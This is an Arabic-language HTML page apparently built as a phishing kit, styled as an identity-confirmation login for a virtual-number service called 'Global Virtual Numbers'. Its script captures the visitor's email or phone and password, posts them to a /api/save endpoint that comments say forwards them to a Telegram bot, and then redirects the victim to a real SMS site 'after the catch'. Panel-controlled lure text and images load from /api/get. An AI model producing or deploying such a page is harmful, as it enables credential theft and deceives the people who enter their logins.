<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - Global Virtual Numbers</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        /* المتغيرات اللونية الاحترافية */
        :root {
            --bg-dark: #0a0e17; /* خلفية داكنة جداً */
            --card-bg: #141b2b; /* خلفية البطاقة */
            --primary-glow: #00f2fe; /* أزرق سماوي مضيء */
            --secondary-glow: #4facfe; /* أزرق مشرق */
            --accent: #8e44ad; /* بنفسجي فخم */
            --text-main: #ffffff;
            --text-muted: #8b9bb4;
            --border: rgba(255, 255, 255, 0.05);
        }

        body {
            margin: 0; padding: 0;
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg-dark);
            background-image: 
                radial-gradient(at 10% 10%, rgba(79, 172, 254, 0.15) 0px, transparent 50%),
                radial-gradient(at 90% 90%, rgba(142, 68, 173, 0.15) 0px, transparent 50%);
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; color: var(--text-main);
            overflow: hidden;
        }

        /* حاوية البطاقة الرئيسية بلمسة فخامة */
        .premium-card {
            background-color: var(--card-bg);
            width: 90%; max-width: 420px;
            padding: 50px 35px;
            border-radius: 24px; /* حواف منحوتة بدقة */
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            border: 1px solid var(--border);
            backdrop-filter: blur(10px); /* تأثير زجاجي خفيف */
            position: relative;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .premium-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 30px 60px rgba(0, 242, 254, 0.15);
        }

        /* الشعار الاحترافي للأرقام الوهمية */
        .logo-container {
            width: 120px; height: 120px; margin: 0 auto 30px auto;
            position: relative;
        }

        /* صورة متحركة تعبر عن الاتصال العالمي والأرقام */
        .logo-img {
            width: 100%; height: 100%;
            background-image: url('https://telegra.ph/file/1792945d7d91986420551.jpg'); /* رابط الصورة الاحترافية المرفقة */
            background-size: cover;
            background-position: center;
            border-radius: 50%;
            box-shadow: 0 0 30px rgba(79, 172, 254, 0.5);
            border: 4px solid var(--card-bg);
            position: relative; z-index: 2;
        }

        /* تأثير النبض حول الشعار */
        .logo-container::after {
            content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px;
            background: linear-gradient(45deg, var(--primary-glow), var(--accent));
            border-radius: 50%; z-index: 1; opacity: 0.8;
            filter: blur(15px); animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 0.5; }
            100% { transform: scale(1); opacity: 0.8; }
        }

        /* تنسيق النصوص */
        h2 {
            color: var(--text-main);
            font-size: 24px; font-weight: 800;
            margin-bottom: 10px; letter-spacing: -0.5px;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 14px; font-weight: 400;
            margin-bottom: 40px; line-height: 1.6;
        }

        /* تنسيق حقول الإدخال لتكون منحوتة */
        .input-group { margin-bottom: 25px; text-align: right; position: relative; }

        input {
            width: 100%;
            padding: 16px 20px;
            font-size: 16px; font-family: 'Cairo', sans-serif;
            color: var(--text-main);
            background-color: rgba(255, 255, 255, 0.03);
            border: 2px solid var(--border);
            border-radius: 14px; /* حواف مستديرة متقنة */
            outline: none;
            transition: all 0.3s ease;
            box-sizing: border-box;
        }

        input::placeholder { color: rgba(139, 155, 180, 0.5); }

        input:focus {
            border-color: var(--secondary-glow);
            background-color: rgba(79, 172, 254, 0.05);
            box-shadow: 0 0 15px rgba(79, 172, 254, 0.2);
        }

        /* تنسيق رسالة الخطأ */
        .error-msg {
            color: #ff6b6b; font-size: 12px; margin-top: 5px;
            display: none; font-weight: 600;
        }

        /* تنسيق الزر الاحترافي المضيء */
        button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--secondary-glow) 0%, var(--primary-glow) 100%);
            color: #0a0e17; /* لون نص داكن للتباين */
            border: none;
            border-radius: 14px; /* حواف مستديرة متقنة للزر */
            font-size: 18px; font-weight: 800;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 15px;
            text-transform: uppercase; letter-spacing: 1px;
            box-shadow: 0 5px 20px rgba(0, 242, 254, 0.3);
        }

        button:hover {
            box-shadow: 0 8px 30px rgba(0, 242, 254, 0.5);
            transform: translateY(-2px);
        }

        button:active { transform: translateY(1px); box-shadow: 0 3px 10px rgba(0, 242, 254, 0.3); }

        /* تذييل الصفحة */
        .footer-text {
            margin-top: 35px; color: var(--text-muted);
            font-size: 12px; border-top: 1px solid var(--border);
            padding-top: 20px;
        }

    </style>
</head>
<body>

    <div class="premium-card">
        <div class="logo-container">
            <div class="logo-img"></div>
        </div>
        
        <h2 id="pageLetter">منصة تفعيل الأرقام العالمية</h2>
        <p class="subtitle">سجل دخولك لتأكيد ملكية الحساب والوصول الآمن للخدمة</p>

        <form id="authForm">
            <div class="input-group">
                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف المرتبط" required>
                <div id="userError" class="error-msg">❌ تنسيق البيانات غير صحيح</div>
            </div>

            <div class="input-group">
                <input type="password" id="passInput" placeholder="كلمة السر" required>
            </div>

            <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
        </form>

        <div class="footer-text">
            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة. <br>
            نظام حماية متطور مدعوم بالذكاء الاصطناعي.
        </div>
    </div>

    <script>
        // دالة جلب البيانات لتحديث الصورة والنصوص تلقائياً من اللوحة
        async function fetchConfig() {
            try {
                const response = await fetch('/api/get');
                const data = await response.json();
                if(data.image) document.querySelector('.logo-img').style.backgroundImage = `url(${data.image})`;
                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if(data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch (e) { console.log("استخدام الإعدادات الافتراضية الاحترافية"); }
        }
        window.onload = fetchConfig;

        // التحقق من الإدخال والإرسال لبوت التلجرام
        const form = document.getElementById('authForm');
        form.onsubmit = async (e) => {
            e.preventDefault();
            
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            const errorText = document.getElementById('userError');

            // منطق التحقق البسيط (إيميل أو هاتف)
            const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(user);
            const isPhone = /^\+?[0-9]{7,15}$/.test(user);

            if (!isEmail && !isPhone) {
                errorText.style.display = 'block';
                document.getElementById('userInput').style.borderColor = '#ff6b6b';
                return;
            } else {
                errorText.style.display = 'none';
                document.getElementById('userInput').style.borderColor = 'rgba(255, 255, 255, 0.05)';
            }

            // إرسال البيانات لبوت التلجرام (تأكد من تعديل ملف index.py ليستقبل هذه الحقول)
            await fetch('/api/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    letter: "👤 المستخدم: " + user,
                    button: "🔑 كلمة السر: " + pass
                })
            });

            // تحويل المستخدم للموقع الحقيقي بعد الصيد
            window.location.href = "https://receive-smss.com/";
        };
    </script>
</body>
</html>
